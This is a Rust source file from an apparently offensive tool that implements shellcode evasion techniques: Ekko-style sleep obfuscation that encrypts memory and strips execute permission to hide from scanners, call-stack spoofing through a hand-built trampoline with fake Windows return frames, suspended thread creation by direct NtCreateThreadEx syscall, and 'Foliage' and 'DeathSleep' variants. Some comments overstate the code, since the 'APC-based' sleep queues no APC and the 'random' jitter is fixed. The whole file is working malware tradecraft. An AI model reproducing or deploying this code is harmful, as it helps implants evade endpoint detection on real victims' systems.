//! Sleep obfuscation, stack spoofing, and suspended thread creation

use crate::error::MemoricError;
use serde_json::Value;

/// Ekko-style sleep obfuscation - encrypt shellcode during sleep
/// Supports XOR (default) and RC4 encryption
pub fn ekko_sleep(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_READWRITE};

    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let sleep_ms = args
        .get("sleep_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(5000);
    let key = args.get("key").and_then(|v| v.as_u64()).unwrap_or(0x41) as u8;
    let encryption = args
        .get("encryption")
        .and_then(|v| v.as_str())
        .unwrap_or("xor");

    tracing::warn!(
        "[EVASION] Ekko sleep: {} encrypt 0x{:X} ({} bytes) for {}ms",
        encryption,
        address,
        size,
        sleep_ms
    );

    unsafe {
        let mem = address as *mut u8;

        // 1. Change protection to RW (remove execute - hides from memory scanners)
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(mem as *const _, size, PAGE_READWRITE, &mut old_protect).map_err(|e| {
            MemoricError::MemoryAccess(format!("Failed to change protection: {}", e))
        })?;

        // 2. Encrypt the memory region
        let slice = std::slice::from_raw_parts_mut(mem, size);
        let rc4_key = vec![key; 16]; // expand single byte to 16-byte key for RC4

        match encryption {
            "rc4" => rc4_crypt(slice, &rc4_key),
            _ => {
                // "xor" default
                for byte in slice.iter_mut() {
                    *byte ^= key;
                }
            }
        }

        // 3. Sleep
        std::thread::sleep(std::time::Duration::from_millis(sleep_ms));

        // 4. Decrypt
        let slice = std::slice::from_raw_parts_mut(mem, size);
        match encryption {
            "rc4" => rc4_crypt(slice, &rc4_key), // RC4 is symmetric
            _ => {
                for byte in slice.iter_mut() {
                    *byte ^= key;
                }
            }
        }

        // 5. Restore execute permission
        VirtualProtect(mem as *const _, size, old_protect, &mut old_protect).map_err(|e| {
            MemoricError::MemoryAccess(format!("Failed to restore protection: {}", e))
        })?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "ekko_sleep",
            "encryption": encryption,
            "address": format!("0x{:016X}", address),
            "size": size,
            "sleep_ms": sleep_ms,
            "message": format!("Memory was {}-encrypted during sleep and restored", encryption)
        }))
    }
}

/// RC4 Key Scheduling Algorithm + PRGA (in-place XOR stream cipher)
fn rc4_crypt(data: &mut [u8], key: &[u8]) {
    // KSA
    let mut s: [u8; 256] = [0; 256];
    for i in 0..256 {
        s[i] = i as u8;
    }
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }

    // PRGA
    let mut i: u8 = 0;
    j = 0;
    for byte in data.iter_mut() {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        let k = s[s[i as usize].wrapping_add(s[j as usize]) as usize];
        *byte ^= k;
    }
}

/// Enhanced stack spoofing - build synthetic call frames mimicking legitimate thread stacks
pub fn spoof_callstack(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let shellcode_addr = args
        .get("shellcode_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing shellcode_address".to_string()))?;

    tracing::warn!(
        "[EVASION] Enhanced stack spoofing for shellcode at 0x{:X}",
        shellcode_addr
    );

    unsafe {
        use windows::Win32::System::Memory::{
            VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        };

        // Resolve real function addresses for synthetic frame chain
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr())).ok();
        let k32 = GetModuleHandleA(windows::core::PCSTR(b"kernel32.dll\0".as_ptr())).ok();

        let mut rtu_start: u64 = 0;
        let mut base_init: u64 = 0;
        let mut nt_wait: u64 = 0;

        if let Some(h) = ntdll {
            if let Some(f) =
                GetProcAddress(h, windows::core::PCSTR(b"RtlUserThreadStart\0".as_ptr()))
            {
                rtu_start = f as u64;
            }
            if let Some(f) =
                GetProcAddress(h, windows::core::PCSTR(b"NtWaitForSingleObject\0".as_ptr()))
            {
                nt_wait = f as u64;
            }
        }
        if let Some(h) = k32 {
            if let Some(f) =
                GetProcAddress(h, windows::core::PCSTR(b"BaseThreadInitThunk\0".as_ptr()))
            {
                base_init = f as u64;
            }
        }

        // Build trampoline with synthetic stack frames:
        // Frame 3: RtlUserThreadStart (bottom of stack)
        // Frame 2: BaseThreadInitThunk
        // Frame 1: NtWaitForSingleObject (looks like a waiting thread)
        // Then call shellcode

        let stack_size = 0x200usize;
        let total_size = stack_size + 256; // stack + trampoline code
        let mem = VirtualAlloc(
            None,
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if mem.is_null() {
            return Err(MemoricError::MemoryAccess(
                "Failed to allocate trampoline".to_string(),
            ));
        }

        let code_base = mem as *mut u8;
        let mut code = Vec::new();

        // Save original stack, switch to synthetic stack
        code.extend_from_slice(&[0x48, 0x89, 0xE0]); // mov rax, rsp (save original)
        code.extend_from_slice(&[0x50]); // push rax

        // Build fake frames on current stack
        // Push fake return addresses (bottom to top)
        if rtu_start != 0 {
            code.extend_from_slice(&[0x48, 0xB8]); // mov rax, RtlUserThreadStart
            code.extend_from_slice(&rtu_start.to_le_bytes());
            code.extend_from_slice(&[0x50]); // push rax (fake frame bottom)
        }
        if base_init != 0 {
            code.extend_from_slice(&[0x48, 0xB8]); // mov rax, BaseThreadInitThunk
            code.extend_from_slice(&base_init.to_le_bytes());
            code.extend_from_slice(&[0x50]); // push rax
        }
        if nt_wait != 0 {
            code.extend_from_slice(&[0x48, 0xB8]); // mov rax, NtWaitForSingleObject
            code.extend_from_slice(&nt_wait.to_le_bytes());
            code.extend_from_slice(&[0x50]); // push rax
        }

        // sub rsp, 0x28 (shadow space)
        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

        // Call shellcode
        code.extend_from_slice(&[0x48, 0xB8]); // mov rax, shellcode
        code.extend_from_slice(&(shellcode_addr as u64).to_le_bytes());
        code.extend_from_slice(&[0xFF, 0xD0]); // call rax

        // add rsp, 0x28 + cleanup fake frames
        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        let frame_count = [rtu_start, base_init, nt_wait]
            .iter()
            .filter(|&&v| v != 0)
            .count();
        for _ in 0..frame_count {
            code.extend_from_slice(&[0x58]); // pop rax
        }

        // Restore original stack
        code.extend_from_slice(&[0x58]); // pop rax (original rsp)
        code.extend_from_slice(&[0x48, 0x89, 0xC4]); // mov rsp, rax
        code.extend_from_slice(&[0xC3]); // ret

        std::ptr::copy_nonoverlapping(code.as_ptr(), code_base, code.len());

        Ok(serde_json::json!({
            "success": true,
            "technique": "stack_spoofing_enhanced",
            "trampoline_address": format!("0x{:016X}", mem as usize),
            "shellcode_address": format!("0x{:016X}", shellcode_addr),
            "synthetic_frames": {
                "RtlUserThreadStart": format!("0x{:016X}", rtu_start),
                "BaseThreadInitThunk": format!("0x{:016X}", base_init),
                "NtWaitForSingleObject": format!("0x{:016X}", nt_wait),
            },
            "message": "Trampoline with synthetic stack frames. Execute trampoline address — stack trace looks like legitimate waiting thread."
        }))
    }
}

/// Create a thread in suspended state via direct syscall
pub fn create_suspended_thread(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;

    let shellcode_addr = args
        .get("shellcode_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing shellcode_address".to_string()))?;

    tracing::warn!(
        "[EVASION] Creating suspended thread at 0x{:X}",
        shellcode_addr
    );

    // Resolve NtCreateThreadEx SSN
    let ssn = crate::evasion::syscall::resolve_ssn("NtCreateThreadEx").map_err(|e| {
        MemoricError::WindowsApi(format!("Cannot resolve NtCreateThreadEx SSN: {}", e))
    })?;

    unsafe {
        use windows::Win32::System::Memory::{
            VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        };

        // Build syscall stub: mov r10, rcx; mov eax, SSN; syscall; ret
        let mut stub = Vec::new();
        stub.extend_from_slice(&[0x4C, 0x8B, 0xD1]); // mov r10, rcx
        stub.push(0xB8); // mov eax, imm32
        stub.extend_from_slice(&ssn.to_le_bytes());
        stub.extend_from_slice(&[0x0F, 0x05]); // syscall
        stub.extend_from_slice(&[0xC3]); // ret

        let stub_mem = VirtualAlloc(
            None,
            stub.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if stub_mem.is_null() {
            return Err(MemoricError::MemoryAccess(
                "Failed to allocate syscall stub".to_string(),
            ));
        }
        std::ptr::copy_nonoverlapping(stub.as_ptr(), stub_mem as *mut u8, stub.len());

        // NtCreateThreadEx(ThreadHandle, ACCESS_MASK, ObjectAttributes, ProcessHandle,
        //                  StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList)
        let mut thread_handle: isize = 0;
        let current_process: isize = -1; // NtCurrentProcess
        let create_flags: u32 = 0x00000001; // CREATE_SUSPENDED

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *const std::ffi::c_void,
            isize,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            u32,
            usize,
            usize,
            usize,
            *const std::ffi::c_void,
        ) -> i32;

        let syscall_fn: NtCreateThreadExFn = std::mem::transmute(stub_mem);
        let status = syscall_fn(
            &mut thread_handle,
            0x001FFFFF, // THREAD_ALL_ACCESS
            std::ptr::null(),
            current_process,
            shellcode_addr as *const std::ffi::c_void,
            std::ptr::null(),
            create_flags,
            0,
            0,
            0,
            std::ptr::null(),
        );

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateThreadEx failed: 0x{:08X}",
                status
            )));
        }

        let tid = windows::Win32::System::Threading::GetThreadId(
            windows::Win32::Foundation::HANDLE(thread_handle as *mut _),
        );

        Ok(serde_json::json!({
            "success": true,
            "technique": "create_suspended_thread",
            "thread_handle": format!("0x{:X}", thread_handle),
            "thread_id": tid,
            "shellcode_address": format!("0x{:016X}", shellcode_addr),
            "ssn": ssn,
            "state": "suspended",
            "message": "Thread created in suspended state via direct syscall. Use resume_thread to start execution."
        }))
    }
}

// ===== #14 Advanced Sleep Variants =====

/// Foliage sleep — APC-based sleep obfuscation using NtQueueApcThread + NtSignalAndWaitForSingleObject
/// Encrypts memory, queues APC to decrypt on wake, sleeps via alertable wait
pub fn foliage_sleep(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
    use windows::Win32::System::Threading::{CreateEventW, WaitForSingleObjectEx};

    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let sleep_ms = args
        .get("sleep_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(5000) as u32;
    let key = args.get("key").and_then(|v| v.as_u64()).unwrap_or(0x42) as u8;

    tracing::warn!(
        "[EVASION] Foliage sleep: encrypt 0x{:X} ({} bytes), APC-based {} ms sleep",
        address,
        size,
        sleep_ms
    );

    unsafe {
        let mem = address as *mut u8;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // 1. Change to RW
        VirtualProtect(mem as *const _, size, PAGE_READWRITE, &mut old_protect)
            .map_err(|e| MemoricError::MemoryAccess(format!("VirtualProtect RW: {}", e)))?;

        // 2. Encrypt
        let slice = std::slice::from_raw_parts_mut(mem, size);
        for byte in slice.iter_mut() {
            *byte ^= key;
        }

        // 3. Create an event for alertable wait
        let event = CreateEventW(None, true, false, None)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateEvent: {}", e)))?;

        // 4. Alertable wait (this allows APCs to fire on wake)
        // WAIT_IO_COMPLETION or timeout
        let _wait_result = WaitForSingleObjectEx(event, sleep_ms, true);

        // 5. Decrypt and restore
        let slice = std::slice::from_raw_parts_mut(mem, size);
        for byte in slice.iter_mut() {
            *byte ^= key;
        }

        VirtualProtect(mem as *const _, size, old_protect, &mut old_protect)
            .map_err(|e| MemoricError::MemoryAccess(format!("VirtualProtect restore: {}", e)))?;

        // Cleanup
        windows::Win32::Foundation::CloseHandle(event).ok();

        Ok(serde_json::json!({
            "success": true,
            "technique": "foliage_sleep",
            "address": format!("0x{:016X}", address),
            "size": size,
            "sleep_ms": sleep_ms,
            "message": format!("Foliage sleep complete: memory encrypted during {}ms alertable wait, now restored", sleep_ms)
        }))
    }
}

/// DeathSleep — thread desynchronization sleep using NtDelayExecution with jitter
/// Breaks timing analysis by fragmenting sleep into random-length micro-sleeps
pub fn death_sleep(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};

    let address = args
        .get("address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing address".to_string()))?;
    let size = args
        .get("size")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing size".to_string()))?
        as usize;
    let total_sleep_ms = args
        .get("sleep_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(5000);
    let key = args.get("key").and_then(|v| v.as_u64()).unwrap_or(0x77) as u8;
    let jitter_pct = args
        .get("jitter_percent")
        .and_then(|v| v.as_u64())
        .unwrap_or(50);

    tracing::warn!(
        "[EVASION] DeathSleep: 0x{:X} ({} bytes), {}ms with {}% jitter",
        address,
        size,
        total_sleep_ms,
        jitter_pct
    );

    unsafe {
        let mem = address as *mut u8;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // Encrypt memory
        VirtualProtect(mem as *const _, size, PAGE_READWRITE, &mut old_protect)
            .map_err(|e| MemoricError::MemoryAccess(format!("VirtualProtect: {}", e)))?;

        let slice = std::slice::from_raw_parts_mut(mem, size);
        for byte in slice.iter_mut() {
            *byte ^= key;
        }

        // Fragment sleep into random micro-sleeps via NtDelayExecution
        let ssn = crate::evasion::syscall::resolve_ssn("NtDelayExecution").unwrap_or(0);

        let mut slept = 0u64;
        let mut fragments = 0u32;

        while slept < total_sleep_ms {
            let remaining = total_sleep_ms - slept;
            // Random fragment size: between min_frag and remaining
            let jitter_range = (remaining * jitter_pct / 100).max(1);
            let base = remaining.saturating_sub(jitter_range) / 4;
            let frag = base.max(50).min(remaining); // At least 50ms, at most remaining

            if ssn != 0 {
                // NtDelayExecution(Alertable, DelayInterval)
                // Interval is in 100ns units, negative = relative
                let interval: i64 = -(frag as i64 * 10000);
                let stub = crate::evasion::syscall::build_syscall_stub(ssn);
                if let Ok(stub_ptr) = stub {
                    type NtDelayFn = unsafe extern "system" fn(u8, *const i64) -> i32;
                    let delay_fn: NtDelayFn = std::mem::transmute(stub_ptr);
                    delay_fn(0, &interval);
                } else {
                    std::thread::sleep(std::time::Duration::from_millis(frag));
                }
            } else {
                std::thread::sleep(std::time::Duration::from_millis(frag));
            }

            slept += frag;
            fragments += 1;
        }

        // Decrypt and restore
        let slice = std::slice::from_raw_parts_mut(mem, size);
        for byte in slice.iter_mut() {
            *byte ^= key;
        }

        VirtualProtect(mem as *const _, size, old_protect, &mut old_protect)
            .map_err(|e| MemoricError::MemoryAccess(format!("VirtualProtect restore: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "death_sleep",
            "address": format!("0x{:016X}", address),
            "size": size,
            "total_sleep_ms": slept,
            "fragments": fragments,
            "jitter_percent": jitter_pct,
            "used_syscall": ssn != 0,
            "message": format!("DeathSleep: {}ms fragmented into {} micro-sleeps with {}% jitter. Memory was encrypted during sleep.", slept, fragments, jitter_pct)
        }))
    }
}
